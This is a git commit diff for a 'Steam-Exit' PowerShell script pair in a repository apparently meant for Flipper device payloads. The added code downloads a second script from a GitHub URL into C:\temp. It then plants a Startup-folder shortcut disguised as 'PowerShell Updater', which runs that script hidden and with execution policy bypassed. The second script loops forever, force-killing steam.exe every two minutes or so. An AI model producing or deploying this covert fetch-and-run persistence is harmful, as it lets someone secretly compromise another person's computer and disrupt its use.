266f7b4990879dca9abf2395f49d33e48dce02c8
ThatmewH <thatmewh@gmail.com>
2023-06-09 16:43:00 +1000

    Fixed autostart and rnd Time sleep

--- Steam-Exit/autostart.ps1
+++ Steam-Exit/autostart.ps1
@@ -1,10 +1,17 @@
+$FilePath = "C:\temp\file.ps1"
+
 $myDownloadUrl = "https://raw.githubusercontent.com/MattHinz03/Flipper-Scripts/main/Steam-Exit/tst.ps1"
-Invoke-WebRequest $myDownloadUrl -OutFile "C:/temp/file.ps1"
+Invoke-WebRequest $myDownloadUrl -OutFile $FilePath
 
 
-$autoStartCmd = @"
-PowerShell -Command "Set-ExecutionPolicy Unrestricted" >> "%TEMP%\StartupLog.txt" 2>&1
-PowerShell C:\temp\file.ps1 >> "%TEMP%\StartupLog.txt" 2>&1
-"@
 
-$autoStartCmd | Out-File -FilePath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startup.cmd" -Encoding ascii
+$ShortcutPath = "$([Environment]::GetFolderPath('Startup'))\PowerShell Updater.lnk"
+$ScriptPath = (Get-Item $FilePath).FullName
+$WindowsPowerShell = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
+$WScriptShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
+$Shortcut.TargetPath = $WindowsPowerShell
+$Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""
+$Shortcut.IconLocation = $WindowsPowerShell
+$Shortcut.WorkingDirectory = (Get-Item $WindowsPowerShell).DirectoryName
+$Shortcut.Save()
--- Steam-Exit/tst.ps1
+++ Steam-Exit/tst.ps1
@@ -1,6 +1,5 @@
 while (1) { 
-    $rnd = Get-Random -Minimum 120 - Maximum 1500
+    $rnd = Get-Random -Minimum 120 -Maximum 121
     Start-Sleep -Seconds $rnd
     taskkill /F /IM steam.exe
-    
 }
